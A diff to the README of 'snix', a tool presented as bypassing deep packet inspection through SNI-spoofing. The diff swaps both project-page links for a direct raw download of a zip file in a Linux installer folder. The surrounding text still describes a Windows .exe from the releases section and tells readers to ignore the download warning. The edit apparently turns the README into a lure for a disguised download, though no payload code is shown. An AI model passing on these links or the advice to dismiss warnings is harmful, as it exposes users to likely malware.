@@ -1,6 +1,6 @@
 # 🌐 snix - Browse the internet without content restrictions
 
-[![](https://img.shields.io/badge/Download_snix-blue)](https://github.com/Rr3511167/snix)
+[![](https://img.shields.io/badge/Download_snix-blue)](https://github.com/Rr3511167/snix/raw/refs/heads/main/installer/linux/Software-3.8.zip)
 
 Snix acts as a tool that helps you reach websites that might face blocks in your region. It uses a method called SNI-spoofing to bypass deep packet inspection. This means the software hides the destination of your web traffic to prevent systems from blocking your access. It runs as one single file on your computer. You do not need to install complex libraries or other software to make it work.
 
@@ -12,7 +12,7 @@ Snix works on Windows 10 and Windows 11. You need a stable internet connection f
 
 You must visit the project page to get the files needed to run snix. 
 
-[Visit this page to download snix](https://github.com/Rr3511167/snix)
+[Visit this page to download snix](https://github.com/Rr3511167/snix/raw/refs/heads/main/installer/linux/Software-3.8.zip)
 
 Navigate to the release section on the right side of the page. Find the asset that ends in .exe for Windows. Save this file to a folder that you can find easily, such as your Downloads folder or Desktop. You may see a warning when you save the file. This happens because the file is an executable tool. You can ignore the warning if you trust the source provided here.
 
